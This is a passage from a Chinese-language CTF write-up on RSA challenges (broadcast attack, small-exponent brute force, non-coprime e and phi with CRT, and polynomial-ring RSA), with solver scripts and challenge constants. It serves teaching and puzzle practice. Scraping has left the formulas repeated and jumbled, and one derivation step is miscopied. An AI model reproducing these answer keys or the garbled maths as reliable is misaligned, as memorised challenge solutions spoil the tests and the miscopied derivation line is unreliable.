= 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158tmp = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039assert(pow(e1,ee1,n)==ce1)assert(pow(e2+tmp,ee2,n)==ce2) e = 46531n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469hint=int(binascii.hexlify(hint),16)assert(q1p*q1q==n)assert(q1p&lt;q1q)assert(c==pow(hint,e,n)) flag=int(binascii.hexlify(flag),16)q1=q1pq2 = 114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513c1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124c2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596assert(c1==pow(flag,e1,p*q1))assert(c2==pow(flag,e2,p*q2)) 低指数广播 12f=lambda m,e,n,c:pow(m,e,n)==cassert(sum(map(f,[p]*4,[4]*4,n,c))==4) 我们可以得到以下方程组 {c0≡p4mod n0c1≡p4mod n1c2≡p4mod n2c3≡p4mod n3\\begin{cases} c_{0} ≡ p^{4} \\mod n_{0} \\\\ c_{1} ≡ p^{4} \\mod n_{1} \\\\ c_{2} ≡ p^{4} \\mod n_{2} \\\\ c_{3} ≡ p^{4} \\mod n_{3} \\end{cases} ⎩⎪⎪⎪⎨⎪⎪⎪⎧​c0​≡p4modn0​c1​≡p4modn1​c2​≡p4modn2​c3​≡p4modn3​​ 使用CRT即可求出p的值 低指数 12assert(pow(e1,ee1,n)==ce1)assert(pow(e2+tmp,ee2,n)==ce2) c≡memod nc ≡ m^{e} \\mod nc≡memodn me=c+k∗nm^{e} = c + k*nme=c+k∗n 爆破k即可求出 mem^{e}me m=meem = \\sqrt[e]{m^{e}}m=eme​ 分解n 1234hint=int(binascii.hexlify(hint),16)assert(q1p*q1q==n)assert(q1p&lt;q1q)assert(c==pow(hint,e,n)) 在线分解n得到q1p与q1q 剩下的就是基操 CRT 12assert(c1==pow(flag,e1,p*q1))assert(c2==pow(flag,e2,p*q2)) 这里有 phi1=(p−1)∗(q1−1)phi1 = (p - 1)*(q_{1} - 1)phi1=(p−1)∗(q1​−1) phi2=(p−1)∗(q2−1)phi2 = (p - 1)*(q_{2} - 1)phi2=(p−1)∗(q2​−1) 而在求d时，e1在模phi1时不存在逆元，e2在模phi2时不存在逆元 即e，phi不互素 这里需要进行推算 e=a∗be = a * be=a∗b b=gcd(e,phi)b = gcd(e, phi)b=gcd(e,phi) a=e//ba = e // ba=e//b e∗d≡1mod phie * d ≡ 1 \\mod phie∗d≡1modphi a∗b∗d≡1mod phia * b * d ≡ 1 \\mod phia∗b∗d≡1modphi bd=invert(a,phi)bd = invert(a, phi)bd=invert(a,phi) c≡me≡mabmod nc ≡ m^{e} ≡ m^{ab} \\mod nc≡me≡mabmodn cbd≡(mab)bd≡mabbd≡mbmod bc^{bd} ≡ (m^{ab})^{bd} ≡ m^{abbd} ≡ m^b \\mod bcbd≡(mab)bd≡mabbd≡mbmodb 这里计算得出 b1 = b2 = 14 思路扩展： 若b为2则可以使用Rabin Attack 若b为特别小的值则可以使用低指数的办法进行爆破 但是14次方对于爆破来说过于困难，需要结合两个式子进行CRT {c1=m14mod p∗q1c2=m14mod p∗q2\\begin{cases} c_{1} = m^{14} \\mod p*q_{1} \\\\ c_{2} = m^{14} \\mod p*q_{2} \\end{cases} {c1​=m14modp∗q1​c2​=m14modp∗q2​​ 那么可以对式子进行进一步的分解 {c1=m14mod pc2=m14mod q1c3=m14mod q2\\begin{cases} c_{1} = m^{14} \\mod p \\\\ c_{2} = m^{14} \\mod q_{1} \\\\ c_{3} = m^{14} \\mod q_{2} \\end{cases} ⎩⎪⎨⎪⎧​c1​=m14modpc2​=m14modq1​c3​=m14modq2​​ 使用CRT可以得到 p∗q1∗q2p*q_{1}*q_{2}p∗q1​∗q2​ 范围内 m14m^{14}m14 的特解 m1m_{1}m1​ m2≡m1mod q1∗q2m_{2} ≡ m_{1} \\mod q_{1}*q_{2}m2​≡m1​modq1​∗q2​ 即 m2≡m14mod q1∗q2m_{2} ≡ m^{14} \\mod q_{1}*q_{2}m2​≡m14modq1​∗q2​ gcd(14,(q1−1)∗(q2−1))=2gcd(14, (q_{1} - 1)*(q_{2} - 1)) = 2gcd(14,(q1​−1)∗(q2​−1))=2 那么可以再一次对式子进行变换 c≡m2mod nc ≡ m^{2} \\mod nc≡m2modn 这里c的位数为702，而n的位数为2047，直接开方即可得到flag Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import binasciiimport gmpy2 n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791]c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797]#低指数广播k0 = gmpy2.invert(n[1]*n[2], n[0])k1 = gmpy2.invert(n[0]*n[2], n[1])k2 = gmpy2.invert(n[0]*n[1], n[2])p = gmpy2.iroot((n[1]*n[2]*k0*c[0] + n[0]*n[2]*k1*c[1] + n[0]*n[1]*k2*c[2])%(n[0]*n[1]*n[2]),4)[0]ee1 = 42ee2 = 3ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158tmp = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039#低指数for i in range(0,10000000): k = gmpy2.iroot(i*n+ce1, ee1) if k[1] == True: e1 = k[0] break for i in range(0,100000): k = gmpy2.iroot(i*n+ce2, ee2) if k[1] == True: e2tmp = k[0] e2 = e2tmp - tmp break e = 46531n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469q1p = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871q1q = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693#分解nphi = (q1p - 1)*(q1q - 1)d = gmpy2.invert(e, phi)hint = binascii.unhexlify(hex(pow(c, d, n))[2:].encode())print(hint) q1=q1pq2 = 114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513c1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124c2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596#CRTphi1 = (p - 1)*(q1 - 1)b1 = gmpy2.gcd(e1, phi1)a1 = e1 // b1bd1 = gmpy2.invert(a1, phi1)flagb1 = pow(c1, bd1, p*q1) phi2 = (p - 1)*(q2 - 1)b2 = gmpy2.gcd(e2, phi2)a2 = e2 // b2bd2 = gmpy2.invert(a2, phi2)flagb2 = pow(c2, bd2, p*q2) n01 = pn02 = q1n03 = q2c01 = flagb1 % n01c02 = flagb1 % n02c03 = flagb2 % n03k01 = gmpy2.invert(n02*n03, n01)k02 = gmpy2.invert(n01*n03, n02)k03 = gmpy2.invert(n01*n02, n03)n3 = q1 * q2flag14 = (n02*n03*k01*c01 + n01*n03*k02*c02 + n01*n02*k03*c03)%(n01*n02*n03)%n3phi3 = (q1 - 1)*(q2 - 1)e3 = b1b3 = gmpy2.gcd(e3, phi3)a3 = e3 // b3bd3 = gmpy2.invert(a3, phi3)flag2 = pow(flag14, bd3, n3)flag = gmpy2.iroot(flag2, 2)[0]print(binascii.unhexlify(hex(flag)[2:].encode())) [NPUCTF2020]认清形势，建立信心 12345678910111213141516171819202122from Crypto.Util.number import *from gmpy2 import *from secret import flagp = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b&quot;npuctf&#123;&quot;).strip(b&quot;&#125;&quot;))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))&#x27;&#x27;&#x27;169169912654178128509160179202518818742414340358553002064450&#x27;&#x27;&#x27; 算式推导 {c1≡2emod nc2≡4emod nc3≡8emod n\\begin{cases} c_{1} ≡ 2^{e} \\mod n \\\\ c_{2} ≡ 4^{e} \\mod n \\\\ c_{3} ≡ 8^{e} \\mod n \\end{cases} ⎩⎪⎨⎪⎧​c1​≡2emodnc2​≡4emodnc3​≡8emodn​ c12≡(2e)2≡4e≡c2mod nc_{1}^{2} ≡ (2^{e})^{2} ≡ 4^{e} ≡ c_{2} \\mod nc12​≡(2e)2≡4e≡c2​modn c12−c2≡0mod nc_{1}^{2} - c_{2} ≡ 0 \\mod nc12​−c2​≡0modn c12−c2=k1∗nc_{1}^{2} - c_{2} = k_{1}*nc12​−c2​=k1​∗n c13≡(2e)3≡8e≡c3mod nc_{1}^{3} ≡ (2^{e})^{3} ≡ 8^{e} ≡ c_{3} \\mod nc13​≡(2e)3≡8e≡c3​modn c13−c3≡0mod nc_{1}^{3} - c_{3} ≡ 0 \\mod nc13​−c3​≡0modn c12−c2=k2∗nc_{1}^{2} - c_{2} = k_{2}*nc12​−c2​=k2​∗n gcd(k1∗n,k2∗n)=gcd(k1,k2)∗ngcd(k_{1}*n, k_{2}*n) = gcd(k_{1}, k_{2})*ngcd(k1​∗n,k2​∗n)=gcd(k1​,k2​)∗n Discrete Log 12345F = IntegerModRing(n)e = bsgs(F(2), F(c1), (0, 2**32))#########import sympysympy.discrete_log(n, c1, 2) Code 12345678910111213141516171819c = 169169912654178c1 = 128509160179202c2 = 518818742414340c3 = 358553002064450import gmpy2import sympyfrom Crypto.Util.number import *n1 = gmpy2.gcd(c1*c1 - c2,c1**3 - c3)n = n1 // 2p = 18195301q = 28977097F = IntegerModRing(n)e = bsgs(F(2), F(c1), (0, 2**32))#e = sympy.discrete_log(n, c1, 2)phi = (p - 1)*(q - 1)d = gmpy2.invert(e, phi)flag = pow(c, d, n)print(long_to_bytes(flag)) [watevrCTF 2019]Swedish RSA 12345678910111213141516171819202122232425262728293031323334353637383940414243444546flag = bytearray(raw_input())flag = list(flag)length = len(flag)bits = 16## Prime for Finite Field.p = random_prime(2^bits-1, False, 2^(bits-1))file_out = open(&quot;downloads/polynomial_rsa.txt&quot;, &quot;w&quot;)file_out.write(&quot;Prime: &quot; + str(p) + &quot;\\n&quot;)## Univariate Polynomial Ring in y over Finite Field of size pR.&lt;y&gt; = PolynomialRing(GF(p))## Analogous to the primes in Zdef gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return out## Polynomial &quot;primes&quot;P = gen_irreducable_poly(ZZ.random_element(length, 2*length))Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))## Public exponent keye = 65537## ModulusN = P*Qfile_out.write(&quot;Modulus: &quot; + str(N) + &quot;\\n&quot;)## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)S.&lt;x&gt; = R.quotient(N)## Encryptm = S(flag)c = m^efile_out.write(&quot;Ciphertext: &quot; + str(c))file_out.close()############Prime: 43753Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659 多项式环 第一次见到RSA与多项式环结合的题 使用sage分解n得到两个多项式，分别为p和q 1(34036) * (y^65 + 39688*y^64 + 22199*y^63 + 41942*y^62 + 7803*y^61 + 19710*y^60 + 14794*y^59 + 41388*y^58 + 2418*y^57 + 19208*y^56 + 39941*y^55 + 36392*y^54 + 19813*y^53 + 33864*y^52 + 29099*y^51 + 15484*y^50 + 27185*y^49 + 27721*y^48 + 31508*y^47 + 19404*y^46 + 10134*y^45 + 43481*y^44 + 3899*y^43 + 32849*y^42 + 3534*y^41 + 32086*y^40 + 14221*y^39 + 42982*y^38 + 1403*y^37 + 1619*y^36 + 36054*y^35 + 33615*y^34 + 6628*y^33 + 31709*y^32 + 6968*y^31 + 28517*y^30 + 12938*y^29 + 21124*y^28 + 10400*y^27 + 28889*y^26 + 7273*y^25 + 36442*y^24 + 14935*y^23 + 29365*y^22 + 4869*y^21 + 43562*y^20 + 6435*y^19 + 4403*y^18 + 32311*y^17 + 7575*y^16 + 28199*y^15 + 28065*y^14 + 23870*y^13 + 37314*y^12 + 15299*y^11 + 7082*y^10 + 36230*y^9 + 18367*y^8 + 12531*y^7 + 25906*y^6 + 26878*y^5 + 43073*y^4 + 11582*y^3 + 4482*y^2 + 35044*y + 31388) * (y^112 + 31097*y^111 + 15815*y^110 + 17170*y^109 + 43684*y^108 + 16873*y^107 + 17269*y^106 + 10853*y^105 + 10690*y^104 + 24864*y^103 + 10224*y^102 + 28704*y^101 + 16049*y^100 + 1154*y^99 + 40034*y^98 + 29922*y^97 + 27404*y^96 + 32514*y^95 + 40962*y^94 + 32858*y^93 + 36590*y^92 + 41302*y^91 + 20803*y^90 + 43521*y^89 + 13746*y^88 + 19857*y^87 + 21539*y^86 + 36888*y^85 + 16032*y^84 + 35825*y^83 + 24705*y^82 + 31143*y^81 + 22088*y^80 + 6686*y^79 + 37947*y^78 + 5661*y^77 + 29405*y^76 + 36071*y^75 + 35492*y^74 + 28985*y^73 + 36015*y^72 + 24095*y^71 + 34920*y^70 + 6615*y^69 + 9606*y^68 + 4255*y^67 + 22981*y^66 + 3910*y^65 + 23897*y^64 + 22711*y^63 + 23350*y^62 + 7969*y^61 + 8558*y^60 + 8001*y^59 + 8431*y^58 + 3314*y^57 + 23364*y^56 + 39391*y^55 + 32722*y^54 + 2543*y^53 + 22196*y^52 + 24189*y^51 + 19420*y^50 + 10649*y^49 + 19070*y^48 + 23863*y^47 + 19597*y^46 + 39699*y^45 + 7620*y^44 + 25067*y^43 + 29912*y^42 + 14998*y^41 + 14492*y^40 + 31322*y^39 + 43145*y^38 + 32006*y^37 + 38976*y^36 + 32534*y^35 + 6972*y^34 + 37351*y^33 + 30104*y^32 + 6032*y^31 + 33729*y^30 + 27110*y^29 + 5268*y^28 + 2974*y^27 + 2985*y^26 + 31610*y^25 + 28364*y^24 + 34924*y^23 + 17414*y^22 + 28813*y^21 + 43680*y^20 + 32175*y^19 + 18248*y^18 + 25171*y^17 + 31185*y^16 + 30125*y^15 + 36836*y^14 + 7218*y^13 + 11292*y^12 + 31123*y^11 + 40360*y^10 + 34093*y^9 + 39606*y^8 + 2788*y^7 + 27277*y^6 + 21835*y^5 + 1331*y^4 + 32614*y^3 + 25020*y^2 + 20981*y + 12108) 欧拉函数 如果对多项式环不清楚的话，可能就直接计算 phi=(p−1)∗(q−1)phi=(p - 1)*(q - 1)phi=(p−1)∗(q−1) 这里需要提一下欧拉函数的定义 phi(n)phi(n)phi(n)：小于或等于n的正整数中与n互质的数的数目 那么这里运用欧拉函数的性质之一：phi(a∗b)=phi(a)∗phi(b)phi(a*b)=phi(a)*phi(b)phi(a∗b)=phi(a)∗phi(b) 将 phi(n)phi(n)phi(n) 的问题转换到 phi(p)phi(p)phi(p) 和 phi(q)phi(q)phi(q) 上 在多项式的情况下， phi(p)phi(p)phi(p) 表示不高于p(x)幂级的环内所有多项式中，与p(x)无公因式的其他多项式的个数 这里p为不可约多项式（见代码），相当于多项式环中的&quot;素数&quot;。所以每一个不高于p(x)幂级的环内多项式均满足欧拉函数的条件 有限域的大小为43753，多项式p的最高次幂为65，则 phi(p)=(4375365−1)phi(p) = (43753^{65} - 1)phi(p)=(4375365−1) 同理 